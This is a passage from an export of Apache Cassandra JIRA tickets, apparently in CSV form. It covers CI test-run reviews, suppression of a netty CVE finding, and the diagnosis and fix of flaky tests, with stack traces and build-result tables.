|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17636-trunk-A978A1FB-9CF8-4BDB-9087-0106D3433813]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17636-trunk-A978A1FB-9CF8-4BDB-9087-0106D3433813]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1821/]|

 ;;;","30/Jun/22 19:32;jonmeredith;Reviewed test runs

* 4.0

DropCompactStorageTest
 - timeout, passed locally

* 4.1

** CircleCI

org.apache.cassandra.distributed.test.ring.BootstrapTest.readWriteDuringBootstrapTest
 - timeout, passed locally

** Jenkins

 dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_EndsAt_Trunk_HEAD.test_parallel_upgrade	15 min	1
   - unrelated to jvm-dtest
 org.apache.cassandra.distributed.upgrade.MixedModeMessageForwardTest.checkWritesForwardedToOtherDcTest	1 min 19 sec	1
   - passed locally
 org.apache.cassandra.distributed.test.RepairErrorsTest.testRemoteStreamFailure	1 min 27 sec	1
 org.apache.cassandra.distributed.test.RepairErrorsTest.testRemoteSyncFailure	32 sec	1
   - both passed locally - marked as flaky in butler
 org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead	2.7 sec	1
   - butler flaky
 org.apache.cassandra.cql3.ViewLongTest.testExpiredLivenessInfoWithDefaultTTLWithFlush[3]	28 sec	1
 org.apache.cassandra.db.compaction.SingleSSTableLCSTaskTest.uplevelDisabledTest	5 ms	1
 org.apache.cassandra.cql3.validation.operations.SelectTest.filteringWithMultiColumnSlices	1 ms	1
 org.apache.cassandra.cql3.validation.operations.SelectTest.testFilterWithIndexForContains	1 ms	1
 org.apache.cassandra.cql3.validation.operations.SelectTest.filteringWithOrderClause	1 ms	1
 org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCompletedFlag	0 ms	1
 org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexesOnComplexPrimaryKey	1 ms	1
 org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testWriteOnlyIndex	0 ms	1
 org.apache.cassandra.cql3.validation.entities.TupleTypeTest.tupleCkReadWriteDesc	1 ms	1
   - all unrelated to jvm-dtest

* trunk

** CircleCI

org.apache.cassandra.distributed.test.ring.BootstrapTest.readWriteDuringBootstrapTest
 - timeout, passed locally.

org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.testOutboundConnectionsAreInterruptedWhenAuthFails
  - timeout, passed locally.

** Jenkins

dtest-novnode.snitch_test.TestGossipingPropertyFileSnitch.test_prefer_local_reconnect_on_listen_address
dtest.snitch_test.TestGossipingPropertyFileSnitch.test_prefer_local_reconnect_on_listen_address
   - both unrelated to jvm-dtest
org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest
   - very flaky according to butler - hoping it will be fixed once this patch lands on all branches, looks related.
junit.framework.TestSuite.org.apache.cassandra.distributed.test.CASMultiDCTest
   - butler shows intermittent runs and failure so far - passed locally.
org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation
   - flaky CASSANDRA-17461, this patch may help once merged.

org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull
org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnClusteringKeyInsertExpiringColumn
org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnNonFrozenCollectionOfFrozenUDT
org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testCanQuerySecondaryIndex
org.apache.cassandra.cql3.validation.operations.SelectTest.testAllowFilteringOnPartitionKey
org.apache.cassandra.cql3.validation.operations.DeleteTest.testDeleteWithNonoverlappingRange
org.apache.cassandra.cql3.validation.operations.DeleteTest.testStaticColumnDeletionWithMultipleStaticColumnsAndRegularColumns
org.apache.cassandra.cql3.validation.operations.DeleteTest.testStaticColumnDeletionWithMultipleStaticColumns
org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSwitchingCDCWriteModes
org.apache.cassandra.tools.StandaloneSplitterWithCQLTesterTest.testMinFileSizeCheck
org.apache.cassandra.cql3.ViewComplexUpdatesTest.testPartialUpdateWithUnselectedCollectionsWithoutFlush[3]
org.apache.cassandra.cql3.ViewFiltering1Test.testFilterWithFunction[3]
 - all unrelated to jvm-dtest
;;;","30/Jun/22 23:23;jonmeredith;May also help with CASSANDRA-17641 and CASSANDRA-17651. Will leave a note if they clear up then this was the root cause.;;;","01/Jul/22 05:16;bereng;^good job, this is great news [~jonmeredith]! :-) I have reviewed the 4.1 run (trunk failed on some javadoc) and these errors are cleared. We're only left with timeouts and some ip collisions. I am pretty sure they all had the same underlying cause so I will go ahead and close all those duplicates. We can always reopen if needed.;;;","06/Jul/22 18:51;jmckenzie;[ASF CI Results]
Branch: 4.1, build number: 85
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/85/]
JIRA: CASSANDRA-17636
commit url: [https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=008bf8607c55926d0aadb4602a8a854d396c7657]
affected paths:
 * test/distributed/org/apache/cassandra/distributed/action/GossipHelper.java
 * test/distributed/org/apache/cassandra/distributed/impl/AbstractCluster.java
 * test/distributed/org/apache/cassandra/distributed/impl/Instance.java

Build Result: UNSTABLE
Passing Tests: 47953
Failing Tests: 14
||Test|Failures|JIRA|
|dtest-novnode.transient_replication_test.TestTransientReplication.test_transient_write|1 of 82|CASSANDRA-16061?|
|dtest-novnode.transient_replication_ring_test.TestTransientReplicationRing.test_bootstrap_and_cleanup|1 of 82|CASSANDRA-16061?|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.testNestedTuple|13 of 82|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-novnode.replica_side_filtering_test.TestAllowFiltering.test_range_deletion_on_wide_table|1 of 82|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|22 of 82|CASSANDRA-17461?|
|org.apache.cassandra.cql3.validation.operations.SelectTest.testAllowFilteringOnPartitionKey|3 of 82|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.audit.AuditLoggerTest.testCqlKeyspaceAuditing|1 of 82|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-compression|9 of 82|CASSANDRA-17649?|
|dtest-novnode.repair_tests.repair_test.TestRepair.test_parent_repair_session_cleanup|1 of 82|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestRepair*%22]|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCompletedFlag|6 of 82|CASSANDRA-17542?|
|dtest-novnode.user_types_test.TestUserTypes.test_type_keyspace_permission_isolation|1 of 82|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|junit.framework.TestSuite.org.apache.cassandra.distributed.test.CASMultiDCTest|8 of 82|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*test*%22]|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|20 of 82|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|12 of 82|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
netty vulnerable to CVE-2022-24823,CASSANDRA-17633,13445395,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,17/May/22 10:35,05/Oct/22 22:22,13/Jul/23 08:40,18/May/22 15:15,3.0.28,3.11.14,4.0.5,4.1,4.1-alpha1,4.1-beta1,Dependencies,,,,0,,"{noformat}
Dependency-Check Failure:
One or more dependencies were identified with vulnerabilities that have a CVSS score greater than or equal to '1.0': 
netty-all-4.0.44.Final.jar: CVE-2022-24823
See the dependency-check report for more details.
{noformat}

We already have suppressions for 4.0.44 and I suspect this will be another but should be investigated.",,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed May 18 15:15:23 UTC 2022,,,,,,,All,,,,"0|z12frs:",9223372036854775807,,,,e.dimitrova,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/a482e374356fa401829e5e562460087b1d79927a,,,,,,,,,run CI,,,,,"17/May/22 15:29;brandon.williams;From [this page|https://www.cve.org/CVERecord?id=CVE-2022-24823]:

bq. The package `io.netty:netty-codec-http` prior to version 4.1.77.Final contains an insufficient fix for CVE-2021-21290.

We already suppress CVE-2021-21290 and a host of others for this HTTP stuff we don't use, so we will suppress this too.

||Branch||Circle||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17633-3.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/488/workflows/f558c0b1-6499-4aa0-9e6d-bfc9703dce41]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17633-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/487/workflows/f5a022f5-c7ec-42a8-9309-65adf11dde92]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17633-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/485/workflows/df74b108-6127-4229-b1eb-76d63fb402c9], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/485/workflows/b2fdc0f6-7601-41af-8f45-48ed5583c8a9]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17633-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/486/workflows/5971c06f-7b43-44c1-970c-02283b28543b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/486/workflows/f7301676-fc59-4d71-b5a0-06be05d899c1]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17633-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/485/workflows/df74b108-6127-4229-b1eb-76d63fb402c9], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/484/workflows/057192e4-dca7-4fd1-a1c5-7175b8daeec5]|



;;;","18/May/22 01:58;e.dimitrova;+1, all known failures.

I believe you linked by mistake J8 4.0 CI run for trunk J8 but I found the right  [link|https://app.circleci.com/pipelines/github/driftx/cassandra?branch=CASSANDRA-17633-trunk&filter=all].;;;","18/May/22 15:15;brandon.williams;bq. I believe you linked by mistake J8 4.0 CI run for trunk J8

Whoops, yep, I did.

bq. but I found the right  link.

Fantastic, thank you!

Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - org.apache.cassandra.transport.CQLConnectionTest.handleCorruptionOfLargeMessageFrame,CASSANDRA-17630,13445266,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,samt,brandon.williams,brandon.williams,16/May/22 21:22,05/Oct/22 22:22,13/Jul/23 08:40,15/Jun/22 11:13,4.0.5,4.1-beta1,,,,,Messaging/Client,,,,0,,"{noformat}
Stacktrace

junit.framework.AssertionFailedError
	at org.apache.cassandra.transport.CQLConnectionTest.testFrameCorruption(CQLConnectionTest.java:484)
	at org.apache.cassandra.transport.CQLConnectionTest.testFrameCorruption(CQLConnectionTest.java:443)
	at org.apache.cassandra.transport.CQLConnectionTest.handleCorruptionOfLargeMessageFrame(CQLConnectionTest.java:214)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)

{noformat}

https://ci-cassandra.apache.org/job/Cassandra-4.0/391/testReport/org.apache.cassandra.transport/CQLConnectionTest/handleCorruptionOfLargeMessageFrame_cdc_2/",,jmckenzie,samt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,samt,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 27 16:22:14 UTC 2022,,,,,,,All,,,,"0|z12ezs:",9223372036854775807,,,,brandon.williams,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/28690e0ebc6c4df6e2e36c04c93c52f45abda9c9,,,,,,,,,"Test change only, run modified test 1000x in CI to verify stability.",,,,,"16/May/22 21:25;brandon.williams;Also on 4.1: https://ci-cassandra.apache.org/job/Cassandra-4.1/8/testReport/org.apache.cassandra.transport/CQLConnectionTest/handleCorruptionOfLargeMessageFrame_cdc/;;;","10/Jun/22 15:57;brandon.williams;The issue in both cases is the connection is null [here|https://github.com/apache/cassandra/blob/cassandra-4.0/src/java/org/apache/cassandra/transport/Dispatcher.java#L76] causing an NPE.  I can add null protection there to bail out, but I'm not sure that's the best solution. [~samt] it looks like you added this in CASSANDRA-15299, can you advise?;;;","10/Jun/22 16:55;samt;Hmm, there's already a null check directly before {{Dispatcher::processRequest}} is called. In this test it should only ever be called from {{InitialConnectionHandler::decode}} during the hanhdshake because as soon as that's done, we corrupt a frame of the next message which is caught before reaching {{processRequest}} . Do you have logs showing the NPE at all? The 4.0 test you linked to looks to me like it passed and I get a 404 for the 4.1 link.   
;;;","10/Jun/22 16:58;brandon.williams;Here it is from 4.1:

{noformat}
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,926 ExceptionHandlers.java:230 - Unexpected exception during request; channel = [id: 0x428e035b, L:/127.0.0.1:42729 - R:/127.0.0.1:53532]
[junit-timeout] java.lang.NullPointerException: null
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:93)
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:141)
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:168)
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:82)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
[junit-timeout]         at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
[junit-timeout]         at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout]         at java.lang.Thread.run(Thread.java:748)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,926 ExceptionHandlers.java:230 - Unexpected exception during request; channel = [id: 0x428e035b, L:/127.0.0.1:42729 - R:/127.0.0.1:53532]
[junit-timeout] java.lang.NullPointerException: null
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:93)
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:141)
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:168)
[junit-timeout]         at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:82)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
[junit-timeout]         at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
[junit-timeout]         at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout]         at java.lang.Thread.run(Thread.java:748)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 - Exception in thread ""Native-Transport-Requests-2""
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 - Exception in thread ""Native-Transport-Requests-1""
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 - java.lang.NullPointerException
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 -         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:170)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 -         at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:82)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,929 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout] ERROR [Native-Transport-Requests-2] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at java.lang.Thread.run(Thread.java:748)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 - java.lang.NullPointerException
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:170)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:82)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout] ERROR [Native-Transport-Requests-1] 2022-06-10 10:37:29,930 SubstituteLogger.java:265 -         at java.lang.Thread.run(Thread.java:748)
[junit-timeout] INFO  [main] 2022-06-10 10:37:30,909 Server.java:176 - Stop listening for CQL clients
{noformat};;;","10/Jun/22 17:23;samt;Thanks, I still don't see how the connection can be null though so I think it's probably more likely that it's the {{getVersion}} which is returning null, though I still don't see why/how. I'll take it and investigate next week.;;;","10/Jun/22 17:28;brandon.williams;I think you're right and I actually meant the connection in the later processRequest [here|https://github.com/apache/cassandra/blob/cassandra-4.0/src/java/org/apache/cassandra/transport/Dispatcher.java#L105] which makes sense.  Thanks!;;;","14/Jun/22 09:06;samt;The problem turned out to be that the function to inject corruption wasn't always doing so. In cases where the expected corruption wasn't causing the connection to be closed during processing of the second frame of the first large message, the test would go on to process that message without attaching the connection instance to the request, causing the NPE. I've fixed the corruption injection and also made sure the connection is always associated to the request, which would have made the reason for the test failures clearer in the first case.

This is purely a test fix and I've linked to CI with 1000x runs of {{CQLConnectionTest}}, whereas I could reliably trigger failure with a 100x repeat before. The patch applies cleanly to 4.0, 4.1 & trunk.

|[17630-4.0|https://github.com/beobal/cassandra/commits/17630-4.0]|[Circle|https://app.circleci.com/pipelines/github/beobal/cassandra/402/workflows/8326a843-17da-41c2-85e2-f81a7d1c0cab/jobs/4011/steps]|
|[17630-4.1|https://github.com/beobal/cassandra/commits/17630-4.1]|[Circle|https://app.circleci.com/pipelines/github/beobal/cassandra/403/workflows/9ccab1e8-3aa7-4db7-b615-547f2e32a98a/jobs/4013/steps]|
|[17630-trunk|https://github.com/beobal/cassandra/commits/17630-trunk]|[Circle|https://app.circleci.com/pipelines/github/beobal/cassandra/404/workflows/09b78005-8e3b-4aba-868f-e2cfd7cfeb14/jobs/4016/steps]|
;;;","15/Jun/22 07:14;samt;[~brandon.williams] would you mind reviewing when you get a chance please?;;;","15/Jun/22 10:35;brandon.williams;Sure.  Looks good to me, I didn't think to check the test itself! +1;;;","15/Jun/22 11:13;samt;thanks, committed to 4.0 in {{28690e0ebc6c4df6e2e36c04c93c52f45abda9c9}} and merged to 4.1 & trunk;;;","27/Jun/22 16:22;jmckenzie;org.apache.cassandra.transport.CQLConnectionTest.handleCorruptionOfLargeMessageFrame-compression failure showing up for the first time w/this ticket looks suspicious.

[CI Results]
Branch: 4.1, build number: 69
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/69/]
JIRA: CASSANDRA-17630
commit url: [https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=28690e0ebc6c4df6e2e36c04c93c52f45abda9c9]
affected paths:
 * test/unit/org/apache/cassandra/transport/CQLConnectionTest.java

Build Result: UNSTABLE
Passing Tests: 47219
Failing Tests: 9
||Test|Failures|JIRA|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testRangeQuery|4 of 66|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.transport.CQLConnectionTest.handleCorruptionOfLargeMessageFrame-compression|1 of 66|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testCanQuerySecondaryIndex|3 of 66|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome|9 of 66|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexesOnComplexPrimaryKey|5 of 66|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|15 of 66|CASSANDRA-17641?|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.droppingIndexInvalidatesPreparedStatements|3 of 66|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|17 of 66|CASSANDRA-17651?|
|org.apache.cassandra.distributed.test.ring.BootstrapTest.readWriteDuringBootstrapTest|6 of 66|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*BootstrapTest*%22]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky dtest - upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade,CASSANDRA-17629,13445160,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,16/May/22 12:10,05/Oct/22 22:22,13/Jul/23 08:40,20/May/22 10:32,4.0.5,4.1,4.1-alpha1,4.1-beta1,,,Cluster/Schema,,,,0,,"{code}
Error Message

test teardown failure

Stacktrace

Unexpected error found in node logs (see stdout for full details). Errors: [[node3] 'WARN  [MessagingService-Incoming-/127.0.0.2] 2022-05-14 07:23:56,540 IncomingTcpConnection.java:100 - UnknownColumnFamilyException reading from socket; closing\norg.apache.cassandra.db.UnknownColumnFamilyException: Got slice command for nonexistent table system_auth.roles.  If the table was just created, this is likely due to the schema not being fully propagated.  Please wait for schema agreement on table creation.\n\tat org.apache.cassandra.db.SliceFromReadCommandSerializer.deserialize(SliceFromReadCommand.java:184) ~[apache-cassandra-2.2.19.jar:2.2.19]\n\tat org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:158) ~[apache-cassandra-2.2.19.jar:2.2.19]\n\tat org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:132) ~[apache-cassandra-2.2.19.jar:2.2.19]\n\tat org.apache.cassandra.net.MessageIn.read(MessageIn.java:99) ~[apache-cassandra-2.2.19.jar:2.2.19]\n\tat org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:200) ~[apache-cassandra-2.2.19.jar:2.2.19]\n\tat org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:177) ~[apache-cassandra-2.2.19.jar:2.2.19]\n\tat org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:91) ~[apache-cassandra-2.2.19.jar:2.2.19]']
{code}

I thought we might have fixed this with CASSANDRA-17606, but it appears not.",,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17306,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 20 10:32:45 UTC 2022,,,,,,,All,,,,"0|z12eco:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/bd393785ceede6516919aa53f7721eb0557b7827,,,,,,,,,run CI,,,,,"16/May/22 12:27;e.dimitrova;Hm, I think 100 runs of the test to confirm being not flaky anymore is low. Normally I test at least 500;;;","16/May/22 12:31;brandon.williams;I don't think it matters in this instance, it doesn't fail on circle.  But as I said on 17606, waiting for schema is correct regardless, so it's some kind of progress. :);;;","18/May/22 19:28;brandon.williams;This isn't actually as I first thought with CASSANDRA-17606 a schema issue, or at least not one there is control over.  This is happening when 2.2 is [checking for existing 